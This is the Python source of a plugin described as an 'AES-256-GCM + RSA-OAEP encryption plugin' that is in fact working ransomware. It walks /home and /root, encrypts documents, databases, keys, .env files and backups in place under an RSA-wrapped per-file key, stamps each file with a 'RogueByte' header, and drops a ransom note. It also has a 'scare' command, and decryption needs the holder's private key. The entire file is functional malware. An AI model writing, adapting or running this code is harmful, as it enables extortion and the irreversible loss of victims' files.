import os
import struct
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import serialization, hashes

PLUGIN_NAME = 'crypto'
PLUGIN_VERSION = '1.0'
PLUGIN_DESCRIPTION = 'AES-256-GCM + RSA-OAEP encryption plugin'

ROGUEBYTE_HEADER = b"RogueByte"
TARGET_EXTENSIONS = (
    '.txt', '.pdf', '.odt', '.docx', '.doc', '.xls', '.xlsx',
    '.ppt', '.pptx', '.jpg', '.jpeg', '.png', '.raw', '.psd',
    '.mp4', '.mov', '.avi', '.mkv',
    '.zip', '.rar', '.7z', '.tar', '.gz',
    '.sqlite', '.db', '.sql',
    '.pem', '.key',
    '.py', '.js', '.json', '.env',
    '.bak', '.backup',
)


def init(ctx):
    ctx.register_command('encrypt', cmd_encrypt)
    ctx.register_command('decrypt', cmd_decrypt)
    ctx.register_command('find_files', cmd_find_files)
    ctx.register_command('scare', cmd_scare)


def find_target_files(target_dirs):
    found = []
    for root_dir in target_dirs:
        try:
            for dirpath, _dirs, files in os.walk(root_dir):
                for filename in files:
                    fname = os.path.join(dirpath, filename)
                    if fname.lower().endswith(TARGET_EXTENSIONS):
                        found.append(fname)
        except Exception:
            pass
    return found


def encrypt_file(file_path, public_key_pem):
    aes_key = AESGCM.generate_key(bit_length=256)
    nonce = os.urandom(12)
    public_key = serialization.load_pem_public_key(public_key_pem.encode())
    encrypted_aes_key = public_key.encrypt(
        aes_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None,
        ),
    )
    try:
        with open(file_path, 'rb') as f:
            content = f.read()
        aesgcm = AESGCM(aes_key)
        ciphertext = aesgcm.encrypt(nonce, content, None)
        with open(file_path, 'wb') as f:
            f.write(
                ROGUEBYTE_HEADER
                + struct.pack('>H', len(encrypted_aes_key))
                + encrypted_aes_key
                + nonce
                + ciphertext
            )
        return True
    except Exception:
        return False


def decrypt_file(file_path, private_key_pem):
    try:
        with open(file_path, 'rb') as f:
            data = f.read()
    except Exception:
        return False
    if not data.startswith(ROGUEBYTE_HEADER):
        return False
    header_len = len(ROGUEBYTE_HEADER)
    key_len = struct.unpack('>H', data[header_len:header_len + 2])[0]
    pos = header_len + 2
    encrypted_aes_key = data[pos:pos + key_len]
    pos += key_len
    nonce = data[pos:pos + 12]
    ciphertext = data[pos + 12:]
    try:
        private_key = serialization.load_pem_private_key(
            private_key_pem.encode(), password=None
        )
        aes_key = private_key.decrypt(
            encrypted_aes_key,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None,
            ),
        )
        aesgcm = AESGCM(aes_key)
        decrypted = aesgcm.decrypt(nonce, ciphertext, None)
        with open(file_path, 'wb') as f:
            f.write(decrypted)
        return True
    except Exception:
        return False


def count_encrypted_files(file_list):
    count = 0
    for f in file_list:
        try:
            with open(f, 'rb') as fp:
                if fp.read(len(ROGUEBYTE_HEADER)) == ROGUEBYTE_HEADER:
                    count += 1
        except Exception:
            pass
    return count


def write_ransom_note():
    with open("README.txt", "w") as f:
        f.write(
            "Your files have been encrypted.\n"
            "Contact your system administrator.\n"
        )


def write_decrypt_sentinel():
    with open(".decrypt.txt", "w") as f:
        f.write("decrypt_marker")


def cmd_encrypt(params, shared_state):
    state = shared_state.get('state', {})
    public_key_pem = shared_state.get('public_key', '')
    if not public_key_pem:
        return 'encrypt: no public key available'
    target_dirs = params.get('dirs', ['/home', '/root'])
    if isinstance(target_dirs, str):
        target_dirs = [target_dirs]
    files = find_target_files(target_dirs)
    encrypted = 0
    for f in files:
        if encrypt_file(f, public_key_pem):
            encrypted += 1
    state['files_found'] = len(files)
    state['files_encrypted'] = encrypted
    write_ransom_note()
    write_decrypt_sentinel()
    return f'encrypt: {encrypted}/{len(files)} files encrypted'


def cmd_decrypt(params, shared_state):
    state = shared_state.get('state', {})
    private_key_pem = params.get('private_key', '')
    if not private_key_pem:
        return 'decrypt: no private key provided'
    target_dirs = params.get('dirs', ['/home', '/root'])
    if isinstance(target_dirs, str):
        target_dirs = [target_dirs]
    files = find_target_files(target_dirs)
    decrypted = 0
    for f in files:
        if decrypt_file(f, private_key_pem):
            decrypted += 1
    state['files_encrypted'] = 0
    return f'decrypt: {decrypted}/{len(files)} files decrypted'


def cmd_find_files(params, shared_state):
    state = shared_state.get('state', {})
    target_dirs = params.get('dirs', ['/home', '/root'])
    if isinstance(target_dirs, str):
        target_dirs = [target_dirs]
    files = find_target_files(target_dirs)
    enc_count = count_encrypted_files(files)
    state['files_found'] = len(files)
    state['files_encrypted'] = enc_count
    return f'find_files: {len(files)} targets, {enc_count} already encrypted'


def cmd_scare(params, shared_state):
    write_ransom_note()
    write_decrypt_sentinel()
    return 'scare: ransom note written'
